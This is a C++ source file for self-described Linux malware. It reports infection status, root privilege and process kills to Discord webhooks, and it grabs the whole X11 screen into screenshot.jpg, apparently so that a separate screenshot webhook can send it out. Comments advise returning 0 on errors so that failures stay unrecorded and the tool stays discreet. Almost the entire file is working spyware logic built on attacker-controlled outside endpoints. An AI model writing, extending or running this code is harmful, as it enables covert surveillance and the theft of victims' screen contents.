#include "header.h"
#include "functions/handling/handling.h"

//Returning 0 in error cases are for avoid system recollect information about the supposed error), please avoid changing it if you want to be discret.

int main() {
    detect_execution_enviroment();
    
    dotenv::init();
    dpp::cluster temp_token("");
    dpp::webhook MAIN_WEBHOOK(MAIN_WEBHOOK_url);
    dpp::webhook SCREENSHOT_WEBHOOK(SCREENSHOT_WEBHOOK_url);
    dpp::webhook ROOT_WEBHOOK(ROOT_WEBHOOK_url);

    if(geteuid() != 0) {
        dpp::message no_root("");
        no_root.add_embed(isnt_root());
        temp_token.execute_webhook(ROOT_WEBHOOK, no_root);
    } 

    /*dpp::message warning_disclaimer("");
    warning_disclaimer.add_embed(disclaimer_warning());
    temp_token.execute_webhook(MAIN_WEBHOOK, warning_disclaimer); Warning disclaimer commented because is very annoying*/

    if(MAIN_WEBHOOK_url == SCREENSHOT_WEBHOOK_url) {
        dpp::message error_equal_whs("");
        error_equal_whs.add_embed(equal_webhooks());
        std::this_thread::sleep_for(std::chrono::seconds(1));
        temp_token.execute_webhook(MAIN_WEBHOOK, error_equal_whs);
        track_kill(temp_token, MAIN_WEBHOOK);
        return 0;
    } 
    else {
        try {
            dpp::message infect("");
            infect.add_embed(making_connection());
            temp_token.execute_webhook(MAIN_WEBHOOK, infect);

            bool worked = true;
            if(worked == false) {
                dpp::message error_infect("");
                error_infect.add_embed(connection_result(worked));
                std::this_thread::sleep_for(std::chrono::seconds(1)); //Avoid deleting this sleep, so all the code will stop working. due to webhooks limits
                temp_token.execute_webhook(MAIN_WEBHOOK, error_infect);
                track_kill(temp_token, MAIN_WEBHOOK);
                return 0;
            } 
            else {
                dpp::message success_infect("");
                success_infect.add_embed(connection_result(worked));
                std::this_thread::sleep_for(std::chrono::seconds(1));
                temp_token.execute_webhook(MAIN_WEBHOOK, success_infect); 
            } //continue below catch
        } 
        catch(const std::exception& e) {
            dpp::message exception_error("");
            exception_error.add_embed(handle_catch(e));
            std::this_thread::sleep_for(std::chrono::seconds(1));
            temp_token.execute_webhook(MAIN_WEBHOOK, exception_error);
            track_kill(temp_token, MAIN_WEBHOOK);
            return 0;
        }

    Display* display = XOpenDisplay(NULL);
    if (!display) {
        std::cerr << "Unable to open X display." << std::endl;
        return 1;
    }

    Window root = DefaultRootWindow(display);
    XWindowAttributes attrs;
    XGetWindowAttributes(display, root, &attrs);

    XImage* image = XGetImage(display, root, 0, 0, attrs.width, attrs.height, AllPlanes, ZPixmap);

    FILE* file = fopen("screenshot.jpg", "wb");
    if (!file) {
        std::cerr << "Unable to create screenshot file." << std::endl;
        XDestroyImage(image);
        XCloseDisplay(display);
        return 1;
    }

    struct jpeg_compress_struct cinfo;
    struct jpeg_error_mgr jerr;
    cinfo.err = jpeg_std_error(&jerr);
    jpeg_create_compress(&cinfo);
    jpeg_stdio_dest(&cinfo, file);

    cinfo.image_width = image->width;
    cinfo.image_height = image->height;
    cinfo.input_components = 3;
    cinfo.in_color_space = JCS_RGB;
    jpeg_set_defaults(&cinfo);
    jpeg_set_quality(&cinfo, 80, TRUE);

    jpeg_start_compress(&cinfo, TRUE);
    JSAMPROW row_pointer;
    while (cinfo.next_scanline < cinfo.image_height) {
        row_pointer = (JSAMPROW)image->data + cinfo.next_scanline * image->bytes_per_line;
        jpeg_write_scanlines(&cinfo, &row_pointer, 1);
    }
    jpeg_finish_compress(&cinfo);

    jpeg_destroy_compress(&cinfo);
    fclose(file);
    XDestroyImage(image);
    XCloseDisplay(display);
    }
    
    //This never should happen (Malware are continuosly on the system, so register when the mwalware stops processing).
    track_kill(temp_token, MAIN_WEBHOOK);
    return 0;
}